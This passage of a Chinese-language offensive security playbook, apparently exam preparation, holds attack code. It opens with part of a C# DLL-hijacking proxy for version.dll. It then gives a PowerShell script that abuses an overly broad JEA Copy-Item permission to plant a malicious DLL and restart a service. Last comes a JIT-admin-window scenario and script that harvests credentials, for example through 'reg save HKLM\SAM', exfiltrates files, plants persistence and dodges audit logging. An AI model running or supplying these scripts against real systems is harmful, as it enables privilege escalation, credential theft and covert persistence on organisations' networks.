        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate bool VerQueryValueADelegate(byte[] block, string subBlock, out IntPtr buffer, out uint len);

        // 转发：从 System32 的真实 version.dll 取原函数，保证宿主业务不受影响（不闪退）
        private static T Resolve<T>(string exportName) where T : class
        {
            IntPtr h = LoadLibrary(RealDll);
            if (h == IntPtr.Zero) return null;
            IntPtr fn = GetProcAddress(h, exportName);
            if (fn == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer(fn, typeof(T)) as T;
        }

        [DllExport("GetFileVersionInfoW", CallingConvention = CallingConvention.StdCall)]
        public static bool GetFileVersionInfoW(string filename, int handle, int len, byte[] data)
        {
            Payload.Run();
            GetFileVersionInfoWDelegate real = Resolve<GetFileVersionInfoWDelegate>("GetFileVersionInfoW");
            return real != null ? real(filename, handle, len, data) : false;
        }

        [DllExport("GetFileVersionInfoA", CallingConvention = CallingConvention.StdCall)]
        public static bool GetFileVersionInfoA(string filename, int handle, int len, byte[] data)
        {
            Payload.Run();
            GetFileVersionInfoADelegate real = Resolve<GetFileVersionInfoADelegate>("GetFileVersionInfoA");
            return real != null ? real(filename, handle, len, data) : false;
        }

        [DllExport("GetFileVersionInfoSizeW", CallingConvention = CallingConvention.StdCall)]
        public static int GetFileVersionInfoSizeW(string filename, out int handle)
        {
            Payload.Run();
            GetFileVersionInfoSizeWDelegate real = Resolve<GetFileVersionInfoSizeWDelegate>("GetFileVersionInfoSizeW");
            return real != null ? real(filename, out handle) : 0;
        }

        [DllExport("GetFileVersionInfoSizeA", CallingConvention = CallingConvention.StdCall)]
        public static int GetFileVersionInfoSizeA(string filename, out int handle)
        {
            Payload.Run();
            GetFileVersionInfoSizeADelegate real = Resolve<GetFileVersionInfoSizeADelegate>("GetFileVersionInfoSizeA");
            return real != null ? real(filename, out handle) : 0;
        }

        [DllExport("VerQueryValueW", CallingConvention = CallingConvention.StdCall)]
        public static bool VerQueryValueW(byte[] block, string subBlock, out IntPtr buffer, out uint len)
        {
            Payload.Run();
            VerQueryValueWDelegate real = Resolve<VerQueryValueWDelegate>("VerQueryValueW");
            return real != null ? real(block, subBlock, out buffer, out len) : false;
        }

        [DllExport("VerQueryValueA", CallingConvention = CallingConvention.StdCall)]
        public static bool VerQueryValueA(byte[] block, string subBlock, out IntPtr buffer, out uint len)
        {
            Payload.Run();
            VerQueryValueADelegate real = Resolve<VerQueryValueADelegate>("VerQueryValueA");
            return real != null ? real(block, subBlock, out buffer, out len) : false;
        }
    }
}
````

#### 源码 `scripts/powershell/m14-jea-file-copy.ps1` {#scripts-powershell-m14-jea-file-copy-ps1}

````powershell
<#
用途: 自动化“JEA 过宽文件复制”利用——连接 JEA 受限端点、枚举可用命令、无害探边界、
      投放恶意 DLL 到服务加载目录、尝试用 Restart-Service 触发加载。
场景: 场景 42（docs/14-kiosk-jea-jit.md）。角色能力过宽：允许 Copy-Item 且 -Destination
      未限定安全目录；本脚本不依赖会话内能执行任意代码。
依赖: 攻击机 PowerShell 5.1+；目标开放 WinRM 5985/5986；JEA 端点 Permission 含本账户；
      被投放 DLL 见 scripts/csharp/m14-jea-service-dll.cs（或 M04 原生 C 模板）。
使用:
  .\m14-jea-file-copy.ps1 -Target TARGET -Endpoint <JEA端点名> -Domain DOMAIN -User USER `
      -Pass 'PASS' -LocalPayload .\evil.dll -RemoteDir 'C:\Program Files\<Vendor>' `
      -RemoteName 'version.dll' -ServiceName '<svc>' [-ForceRestart] [-ProbeOnly]
  说明: -ProbeOnly 只做“枚举命令 + 写无害探针”两件事，不投放正式载荷，用于确认边界。
       NTHASH 登录不支持原生 WinRM 直连，见 -NTHash 参数说明。
占位符: LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD —— 全部作为命令行参数传入。
测试状态: 未实测（依赖目标环境 JEA 配置；按文档第 42 节先在 -ProbeOnly 下验证边界）。
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)][string]$Target,      # 目标机名/IP（TARGET）
    [Parameter(Mandatory)][string]$Endpoint,    # JEA 会话配置名，如 BackupMaintenance
    [Parameter(Mandatory)][string]$Domain,      # 域名（DOMAIN）
    [Parameter(Mandatory)][string]$User,        # JEA 角色成员账户（USER）
    [string]$Pass,                              # 明文密码（PASS），与 -NTHash 二选一
    [string]$NTHash,                            # NTHASH：仅提示用（WinRM 不支持直连哈希登录）
    [string]$LocalPayload,                      # 本地恶意 DLL 路径（PAYLOAD）
    [string]$RemoteDir,                         # 目标投放目录（服务 exe/插件目录）
    [string]$RemoteName,                        # 投放后的文件名（宿主缺的依赖名）
    [string]$ServiceName,                       # 触发重启的服务名
    [switch]$ForceRestart,                      # 投放后调用 Restart-Service
    [switch]$ProbeOnly                          # 只探边界，不投放正式载荷
)

$ErrorActionPreference = 'Stop'

function New-DomainCred {
    param([string]$Account, [string]$Password)
    $secure = ConvertTo-SecureString $Password -AsPlainText -Force
    New-Object System.Management.Automation.PSCredential($Account, $secure)
}

function Write-Step {
    param([string]$Message, [ConsoleColor]$Color = 'Gray')
    Write-Host ("[+] " + $Message) -ForegroundColor $Color
}

# ---- 0. 参数检查 ----
if (-not $Pass) {
    if ($NTHash) {
        Write-Warning "WinRM/JEA 原生登录不支持直接传 NTHASH。备选："
        Write-Warning "  1) 用 m15 的 evil-winrm 思路配合哈希（evil-winrm 支持 NTLM 哈希）；"
        Write-Warning "  2) 先把 NTHASH 换票/换明文（如 Rubeus asktgt + s4u 后走 Kerberos）。"
        Write-Warning "  本脚本需要 -Pass 明文密码才能 New-PSSession。"
        exit 1
    }
    throw "缺少 -Pass（明文密码）。"
}
if (-not $ProbeOnly -and (-not $LocalPayload -or -not $RemoteDir -or -not $RemoteName)) {
    throw "非 ProbeOnly 模式必须提供 -LocalPayload、-RemoteDir、-RemoteName。"
}

$account = "$Domain\$User"
$cred = New-DomainCred -Account $account -Password $Pass

# ---- 1. 建立 JEA 会话 ----
Write-Step "连接 JEA 端点: $Target / $Endpoint（账户 $account）" 'Cyan'
$session = $null
try {
    $session = New-PSSession -ComputerName $Target -ConfigurationName $Endpoint `
        -Credential $cred -ErrorAction Stop
}
catch {
    Write-Host "[!] 连接失败: $($_.Exception.Message)" -ForegroundColor 'Red'
    Write-Host "    检查: 端点名/账户是否在该端点的 Permission 内/WinRM 是否可达/是否需要 HTTPS。"
    exit 1
}

# ---- 2. 枚举会话内可用命令（能看到的就是能用的） ----
Write-Step "枚举会话内可用命令:" 
$allowed = Invoke-Command -Session $session -ScriptBlock {
    Get-Command | Select-Object Name, CommandType, Source | Sort-Object Name
}
$allowed | Format-Table -AutoSize | Out-String | Write-Host
$hasCopy   = [bool]($allowed | Where-Object { $_.Name -eq 'Copy-Item' })
$hasRestart = [bool]($allowed | Where-Object { $_.Name -eq 'Restart-Service' })
$hasStop    = [bool]($allowed | Where-Object { $_.Name -eq 'Stop-Service' })
$hasStart   = [bool]($allowed | Where-Object { $_.Name -eq 'Start-Service' })

if (-not $hasCopy) {
    Write-Host "[!] 会话内没有 Copy-Item——该端点能力不适用本攻击，退出。" -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 3. 无害探针写入目标目录 ----
$probe = "m14probe_$([guid]::NewGuid().ToString('N').Substring(0,8)).txt"
Write-Step "探边界: Copy-Item 探针 -> $RemoteDir\$probe"
$probeOk = $false
try {
    Invoke-Command -Session $session -ScriptBlock {
        param($dir, $file)
        Set-Content -Path (Join-Path $dir $file) -Value "m14 probe" -ErrorAction Stop
    } -ArgumentList $RemoteDir, $probe
    $probeOk = $true
    Write-Step "探针写入成功：$RemoteDir\$probe（目录在复制能力内）" 'Green'
}
catch {
    Write-Host "[!] 探针写入失败: $($_.Exception.Message)" -ForegroundColor 'Yellow'
    Write-Host "    该目录可能被排除或不可写，换目录再试；或读角色能力 .psrc 找允许路径。"
}

if ($ProbeOnly) {
    Write-Step "ProbeOnly：到此为止。可清理探针（若会话允许 Remove-Item），否则记录路径事后处理。"
    Remove-PSSession $session
    exit 0
}
if (-not $probeOk) {
    Write-Host "[!] 边界探测失败，未投放载荷，退出。可重跑 -ProbeOnly 排查。" -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 4. 投放恶意 DLL ----
Write-Step "投放载荷: $LocalPayload -> $RemoteDir\$RemoteName"
if (-not (Test-Path $LocalPayload)) { throw "本地载荷不存在: $LocalPayload" }
try {
    $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $LocalPayload))
    Invoke-Command -Session $session -ScriptBlock {
        param($dir, $name, $data)
        [System.IO.File]::WriteAllBytes((Join-Path $dir $name), $data)
    } -ArgumentList $RemoteDir, $RemoteName, $bytes
    Write-Step "DLL 已写入: $RemoteDir\$RemoteName（等待触发）" 'Green'
}
catch {
    Write-Host "[!] 投放失败: $($_.Exception.Message)" -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 5. 触发加载 ----
if ($ServiceName -and ($ForceRestart -or $hasRestart -or $hasStop)) {
    Write-Step "触发: 重启/启停服务 $ServiceName"
    try {
        if ($hasRestart) {
            Invoke-Command -Session $session -ScriptBlock {
                param($svc) Restart-Service -Name $svc -Force -ErrorAction Stop
            } -ArgumentList $ServiceName
        }
        elseif ($hasStop -and $hasStart) {
            Invoke-Command -Session $session -ScriptBlock {
                param($svc) Stop-Service -Name $svc -Force; Start-Service -Name $svc
            } -ArgumentList $ServiceName
        }
        Write-Step "服务已重启，DLL 应已被加载（回连窗口 30–60s）" 'Green'
    }
    catch {
        Write-Host "[!] 服务触发失败: $($_.Exception.Message)" -ForegroundColor 'Yellow'
        Write-Host "    备选: 等自动重启/管理员重启；或按文档改为事件触发（登录脚本/计划任务/Startup）。"
    }
}
else {
    Write-Step "无服务控制命令或未指定 -ForceRestart：等待服务自动重启/管理员触发（保持监听）。"
}

Write-Step "完成。若 DLL 回连成功请核对 whoami（应为服务账户）；记得恢复被覆盖文件。"
Remove-PSSession $session
````

## 场景 43 · JIT 时间窗（授权状态 / 令牌刷新时间差 / 窗口内既定命令）

### 场景回顾
环境对管理员权限实施 Just-In-Time（JIT）：平时高权组（如域组 `JIT-Admins`，或目标机本地管理员组）里**没有**目标账户；管理员需要时临时把账户加进组，几分钟到几十分钟后自动移除。我们持有某低权账户凭据，且该账户可能被 JIT 授权（或能接管一个会被授权的账户）。任务：利用**时间窗**拿到高权结果。核心是三点：① 能查询授权状态（何时进窗/出窗）；② 理解令牌刷新时间差（“组被加了”≠“现有会话立刻生效”，反之“组被移除”≠“已签发票据立即失效”）；③ 把窗口内要执行的**高权命令预先编排好**，进窗即跑，不能现场想。

### 前提与假设
- 持有会被 JIT 授权的低权账户凭据；或能先接管 JIT 授权对象账户。
- 至少一条“看窗”途径：能读 AD（LDAP 组成员查询）、能读域控/本机安全日志（4728/4729：组成员增/删）、或环境文档写明 JIT 激活规则与时长。
- Kerberos 为主认证：TGT/服务票据有生命周期，**组 SID 只打进签发时刻的票据**——这是时间差能被利用的根因。
- 攻击机与域控时间已同步（Kerberos 硬性要求）。

### 准备（攻击机侧）
- 预编排窗口内命令清单并排好顺序（见执行步骤 4），因为窗口可能只有几分钟。
- 准备监听与需要落地的持久化/抓取脚本。
- 记录 JIT 预期窗口起止与轮询起点，便于回溯。

### 执行步骤
1. **确定“授权状态”查询途径**（能并行则并行）：
   - AD 组成员（最常用，任意域用户可读）：`Get-ADGroupMember -Identity 'JIT-Admins' -Server DC` 轮询；无 AD 模块时用 ADSI（见脚本实现）。
   - 事件日志：域控安全日志事件 **4728**（成员加入全局组）/ **4729**（移除），过滤目标账户 SID。
   - 本机 JIT（临时加入本地管理员组）：在被控主机上轮询 `net localgroup Administrators`。
2. **理解并实测“令牌刷新时间差”**：
   - **进窗侧**：窗口前已存在的旧会话/旧令牌不含新加的组 SID（`whoami /groups` 看不到）——必须**在窗口内取新令牌**：重新登录、`runas`、新建 PSSession（触发新网络登录 → 新 TGT 带当前组 SID）、或 `klist purge` 后重新获取票据。
   - **出窗侧**：窗口内签发的 Kerberos 票据生命周期（默认 TGT 10h，可续期最长 7 天）**长于组成员资格**——组被移除后，票据里的高权 SID 仍有效直到票据过期/被吊销。续期（renew）只延长时间、不改变 SID 集合。
3. **部署窗口监听**：后台轮询授权状态（`scripts/powershell/m14-jit-admin-window.ps1`）。检测到进窗后立即：
   a. 取新令牌（新建 PSSession / runas / 重新认证到目标机）；
   b. 校验新令牌含高权组：会话内 `whoami /groups | findstr JIT`；
   c. 顺序执行预置命令清单。
4. **窗口内既定命令清单**（按顺序预排、每条尽量短）：
   1) 抓取本机/域高权凭据并回传（Invoke-Mimikatz 等，见 M07）——结果落攻击机，出窗后可继续用；
   2) 读取需要高权的文件/配置（脚本、备份、注册表）并外传；
   3) （可选，放最后）建持久化：计划任务/服务/把我们的账户加进长期组——改变环境的动作单独确认、评估审计风险。
   原则：**先拿结果再谈持久化**；拿到的票据/哈希/远程会话是“窗后可继续用”的资产。
5. **窗口结束后的利用**：轮询发现成员被移除（出窗）后，验证残余会话/票据是否仍带高权 SID（既有 PSSession 的令牌是登录快照，理论上仍含该组）；在票据生命周期内完成横向，不依赖组成员资格本身。

### 用到的脚本
- `scripts/powershell/m14-jit-admin-window.ps1`：轮询授权状态（ADSI 组成员查询为主，本地组/事件日志模式可选）→ 进窗即取新令牌 → 执行预置命令清单 → 记录出窗时间并检查残余令牌状态。

### 验证
- 脚本日志顺序完整：检测进窗 → 新令牌含 JIT 组 → 命令清单逐条成功 → 检测出窗 → 残余令牌检查结果。
- 三态验证：窗内新令牌 `whoami /groups` 含高权组；窗外旧进程令牌不含；窗内建起的 PSSession 出窗后仍可用（登录快照）。
- 清单产物（哈希文件/抓取结果/票据文件）在攻击机侧确认存在。

### 失败分支与备选
- **无法读组成员/事件日志**：按环境文档的 JIT 激活时刻提前蹲守，窗口起点附近高频尝试取新令牌并用 `whoami /groups` 验证（穷举窗口起点）；或观察管理员触发授权的行为规律推断时刻。
- **被授权对象不是我们掌握的账户**：先接管/复用 JIT 授权账户（凭据、会话、令牌），再回到本流程。
- **出窗后残余票据立即失效**（JIT 配了短 TGT 或强制注销）：放弃窗口后利用，把产出集中在窗口内（回连/落库优先）。
- **高权组只对“新交互登录”生效但环境禁多会话/runas**：在窗口内用 S4U 直接申请服务票据（Rubeus `s4u`/`asktgt` 思路），绕过交互登录限制，把高权 SID 固化进可用的票据。

### 考试注意 OPSEC
- 授权状态轮询是低危读操作，但高频轮询留大量 LDAP 查询日志：间隔 ≥5–10s，只在预期窗口前后加密频率。
- 事件日志查询（4728/4729）尽量只查域控，不要横向扫多台机器。
- 窗口内抓凭据/建持久化会被记入 JIT 会话审计：窗口内优先做“拿结果”（抓哈希/外传文件），持久化动作减到最少并放最后。
- 残余票据别用到过期前一秒（续期失败/被吊销现场难收拾）；验证一次可行即转入正式利用，尽快落库。

#### 源码 `scripts/powershell/m14-jit-admin-window.ps1` {#scripts-powershell-m14-jit-admin-window-ps1}

````powershell
<#
用途：JIT 临时管理员窗口作战脚本——查询授权状态（AD 组成员 + 当前令牌组）、刷新票据（klist purge / gpupdate）、
      进窗后按倒计时窗口顺序执行"预先编排好的既定命令清单"，并在窗口结束后检查残余令牌是否仍带高权 SID。
场景：43（JIT 临时管理员权限获批，但有效时间很短）
依赖：Windows PowerShell 3.0+；域内可读 LDAP（389）或可用 Get-ADGroupMember；gpupdate / klist（系统自带）
使用：
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status -Domain DOMAIN -User USER -Group 'JIT-Admins'
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Refresh
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Wait -WindowSec 900 -PollSeconds 10
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Run -CommandFile C:\Users\public\jit-cmds.txt -WindowSec 300
占位符：DOMAIN=AD 域名；USER=会被 JIT 授权的账户；TARGET=目标机；PAYLOAD=既定命令清单文件（每行一条命令）
测试状态：未在 Windows 实测；按 PowerShell 3.0+ 语法编写（可用 Get-Help .\m14-jit-admin-window.ps1 -Full 查看说明）
#>
[CmdletBinding()]
param(
    [ValidateSet('Status', 'Refresh', 'Wait', 'Run')]
    [string]$Mode = 'Status',

    [string]$Domain = 'DOMAIN',
    [string]$User = 'USER',
    [string]$Group = 'JIT-Admins',
    [string]$Computer = 'TARGET',

    [string]$CommandFile = 'PAYLOAD',
    [int]$WindowSec = 300,
    [int]$PollSeconds = 15,
    [int]$DeadlineSec = 1800,

    [string]$LogFile = (Join-Path $env:TEMP 'm14-jit-admin-window.log'),
    [switch]$Help
)

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Write-Output $line
    try { Add-Content -Path $LogFile -Value $line -ErrorAction Stop } catch { }
}

function Get-TokenGroups {
    $out = & whoami /groups 2>$null
    if (-not $out) { $out = @() }
    return $out
}

function Test-TokenHasGroup {
    param([string]$GroupName)
    $groups = Get-TokenGroups
    if (-not $groups) { return $false }
    return [bool]($groups | Select-String -Pattern ([regex]::Escape($GroupName)) -SimpleMatch:$false)
}

# 用 ADSI 读组成员（任意域用户可读，无需 AD 模块）；失败再退回 net group
function Test-GroupMembership {
    param([string]$DomainName, [string]$UserName, [string]$GroupName)

    try {
        $root = [ADSI]"LDAP://$DomainName"
        $gs = New-Object System.DirectoryServices.DirectorySearcher($root)
        $gs.Filter = "(&(objectCategory=group)(cn=$GroupName))"
        [void]$gs.PropertiesToLoad.Add('member')
        $g = $gs.FindOne()
        if (-not $g) { Write-Log "LDAP 未找到组: $GroupName" 'WARN'; return $null }

        $us = New-Object System.DirectoryServices.DirectorySearcher($root)
        $us.Filter = "(&(objectCategory=user)(sAMAccountName=$UserName))"
        [void]$us.PropertiesToLoad.Add('distinguishedName')
        $u = $us.FindOne()
        if (-not $u) { Write-Log "LDAP 未找到用户: $UserName" 'WARN'; return $null }

        $userDn = [string]$u.Properties['distinguishedname'][0]
        $members = @($g.Properties['member'])
        $inGroup = ($members -contains $userDn)
        Write-Log ("AD 组成员判定: {0} in {1} = {2}" -f $UserName, $GroupName, $inGroup)
        return $inGroup
    } catch {
        Write-Log ("ADSI 查询失败，退回 net group: {0}" -f $_.Exception.Message) 'WARN'
        try {
            $raw = & net group "$GroupName" /domain 2>$null
            $inGroup = [bool]($raw | Select-String -Pattern ("\b" + [regex]::Escape($UserName) + "\b"))
            Write-Log ("net group 判定: {0} in {1} = {2}" -f $UserName, $GroupName, $inGroup)
            return $inGroup
        } catch {
            Write-Log "组成员查询不可用（LDAP 与 net group 都失败）" 'WARN'
            return $null
        }
    }
}

function Get-JitAuthStatus {
    Write-Log '=== 授权状态 ==='
    Write-Log ("当前身份: " + (& whoami))
    Write-Log ("目标机  : " + $Computer)

    $inGroup = Test-GroupMembership -DomainName $Domain -UserName $User -GroupName $Group
    if ($inGroup -eq $true) { Write-Log "[IN ] 组成员: 已在 $Group 内（授权已批准）" }
    elseif ($inGroup -eq $false) { Write-Log "[OUT] 组成员: 不在 $Group 内（尚未授权或已到期）" }
    else { Write-Log "[?? ] 组成员: 无法判定" }

    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log "[IN ] 当前令牌: 已含 $Group（可直接用高权）" }
    else { Write-Log "[OUT] 当前令牌: 不含 $Group（旧令牌不含新加的组 SID，需取新令牌）" }

    Write-Log '=== Kerberos 票据 ==='
    try { & klist 2>$null | ForEach-Object { Write-Log ("  " + $_) } }
    catch { Write-Log '  klist 不可用' 'WARN' }

    Write-Log '=== 安全日志 4728/4729（成员加入/移除）==='
    try {
        $events = Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4728, 4729; StartTime = (Get-Date).AddHours(-6) } -MaxEvents 20 -ErrorAction Stop
        foreach ($e in $events) {
            $msg = ($e.Message -split "`r?`n") | Where-Object { $_ -match 'Member|Account|Group' } | Select-Object -First 3
            Write-Log ("  {0} id={1} {2}" -f $e.TimeCreated, $e.Id, ($msg -join ' | '))
        }
        if (-not $events) { Write-Log '  近 6 小时无 4728/4729（可能不在域控上查）' }
    } catch {
        Write-Log ('  事件日志读取失败（需在本机管理员或域控上查）: ' + $_.Exception.Message) 'WARN'
    }
}

# 刷新票据：组成员变了 ≠ 现有令牌立刻变，必须重新取票
function Invoke-TokenRefresh {
    Write-Log '=== 刷新认证状态 ==='
    Write-Log '步骤1: klist purge（清掉旧 TGT/服务票，强制下次重新申请）'
    & klist purge 2>&1 | ForEach-Object { Write-Log ("  " + $_) }

    Write-Log '步骤2: gpupdate /force（拉取新的组策略/组成员）'
    & gpupdate /force 2>&1 | ForEach-Object { Write-Log ("  " + $_) }

    Write-Log '步骤3: 触发一次网络登录拿新令牌（新 PSSession / 新 runas / 重新认证到目标机）'
    Write-Log ("        建议: Enter-PSSession -ComputerName $Computer  或  runas /user:$Domain\$User cmd.exe")

    Write-Log '步骤4: 复核新令牌'
    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log '[+] 新令牌已含高权组，可以开始执行既定命令' }
    else { Write-Log '[-] 新令牌仍未含高权组：确认授权是否生效、票据是否已重新签发' 'WARN' }
    return $inToken
}

function Invoke-PlannedCommands {
    param([string]$File, [int]$WindowSeconds)

    if (-not (Test-Path $File)) {
        Write-Log "找不到命令清单: $File" 'WARN'
        Write-Log '建议的窗口内既定命令（先拿结果，再谈持久化），每行一条写进文件：'
        Write-Log '  whoami /groups | findstr /I "JIT"'
        Write-Log '  reg save HKLM\SAM C:\Users\Public\sam.save /y'
        Write-Log '  reg save HKLM\SECURITY C:\Users\Public\sec.save /y'
        Write-Log '  nltest /domain_trusts'
        return
    }

    $deadline = (Get-Date).AddSeconds($WindowSeconds)
    $cmds = Get-Content -Path $File | Where-Object { $_.Trim() -and -not $_.Trim().StartsWith('#') }
    Write-Log ("=== 窗口内执行 {0} 条既定命令（剩余窗口 {1} 秒）===" -f $cmds.Count, $WindowSeconds)

    foreach ($c in $cmds) {
        $left = [int]($deadline - (Get-Date)).TotalSeconds
        if ($left -le 0) { Write-Log '窗口已到期，停止执行剩余命令' 'WARN'; break }
        Write-Log ("[剩余 {0}s] 执行: {1}" -f $left, $c)
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        try {
            $out = Invoke-Expression -Command $c 2>&1 | Out-String
            $sw.Stop()
            Write-Log ("  完成({0:N1}s) 输出: {1}" -f $sw.Elapsed.TotalSeconds, ($out.Trim() -replace "`r?`n", ' / '))
        } catch {
            $sw.Stop()
            Write-Log ("  失败({0:N1}s): {1}" -f $sw.Elapsed.TotalSeconds, $_.Exception.Message) 'ERROR'
        }
    }
    Write-Log '窗口内动作执行完毕'
}

function Start-JitCountdown {
    param([int]$Seconds)
    Write-Log ("倒计时 {0} 秒（每 10 秒打一次点；窗口短，不要现场想命令）" -f $Seconds)
    $end = (Get-Date).AddSeconds($Seconds)
    $next = (Get-Date).AddSeconds(10)
    while ((Get-Date) -lt $end) {
        Start-Sleep -Seconds 1
        if ((Get-Date) -ge $next) {
            $left = [int]($end - (Get-Date)).TotalSeconds
            if ($left -gt 0) { Write-Log ("  ... 剩余 {0} 秒" -f $left) }
            $next = (Get-Date).AddSeconds(10)
        }
    }
    Write-Log '倒计时结束：检查出窗后残余令牌'
    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log '[+] 残余令牌仍含高权组：票据生命周期长于组成员资格，可继续横向（别用到过期前一秒）' }
    else { Write-Log '[-] 残余令牌已不含高权组：窗口内没拿到可复用资产，回退重排计划' 'WARN' }
}

function Start-JitWait {
    param([int]$Timeout, [int]$Interval)
    Write-Log ("轮询等待授权进窗（最多 {0} 秒，每 {1} 秒一次；间隔 ≥5-10s 以免刷 LDAP 日志）" -f $Timeout, $Interval)
    $deadline = (Get-Date).AddSeconds($Timeout)
    while ((Get-Date) -lt $deadline) {
        $inGroup = Test-GroupMembership -DomainName $Domain -UserName $User -GroupName $Group
        if ($inGroup -eq $true) {
            Write-Log '[+] 检测到进窗，立即刷新票据并执行既定命令'
            if (Invoke-TokenRefresh) {
                Invoke-PlannedCommands -File $CommandFile -WindowSeconds $WindowSec
                Start-JitCountdown -Seconds $WindowSec
            }
            return
        }
        Write-Log ("[*] {0} 尚未进窗，等待中..." -f (Get-Date -Format 'HH:mm:ss'))
        Start-Sleep -Seconds $Interval
    }
    Write-Log '[-] 超时：未检测到进窗（核对 JIT 激活时刻，或改用事件日志 4728 观察）' 'WARN'
}

if ($Help) {
    Write-Output @'
用法: powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode <Status|Refresh|Wait|Run> [参数]

  -Mode Status    查询授权状态：AD 组成员、当前令牌是否含高权组、klist 票据、安全日志 4728/4729
  -Mode Refresh   刷新认证状态：klist purge -> gpupdate /force -> 新建登录取新令牌 -> 复核
  -Mode Wait      轮询等进窗（-DeadlineSec），进窗即刷新票据、执行 -CommandFile、倒计时并查残余令牌
  -Mode Run       认为已在窗口内：直接刷新 -> 复核 -> 在 -WindowSec 秒内执行既定命令清单

  -Domain DOMAIN        AD 域名      -User USER      会被 JIT 授权的账户
  -Group 'JIT-Admins'   高权组名     -Computer TARGET 目标机
  -CommandFile PAYLOAD  窗口内既定命令清单（每行一条，# 开头为注释）
  -WindowSec 300        窗口内动作的时间预算    -DeadlineSec 1800  Wait 模式轮询总时长
'@
    exit 0
}

Write-Log ("=== m14-jit-admin-window 启动: Mode={0} Domain={1} User={2} Group={3} ===" -f $Mode, $Domain, $User, $Group)

switch ($Mode) {
    'Status'  { Get-JitAuthStatus }
    'Refresh' { [void](Invoke-TokenRefresh) }
    'Wait'    { Start-JitWait -Timeout $DeadlineSec -Interval $PollSeconds }
    'Run'     {
        if (Invoke-TokenRefresh) {
            Invoke-PlannedCommands -File $CommandFile -WindowSeconds $WindowSec
            Start-JitCountdown -Seconds $WindowSec
        } else {
            Write-Log '令牌刷新后仍未含高权组：先确认授权状态（-Mode Status）再执行，别在窗口里试错' 'ERROR'
        }
    }
}

Write-Log ("=== 结束，日志位置: {0} ===" -f $LogFile)
````

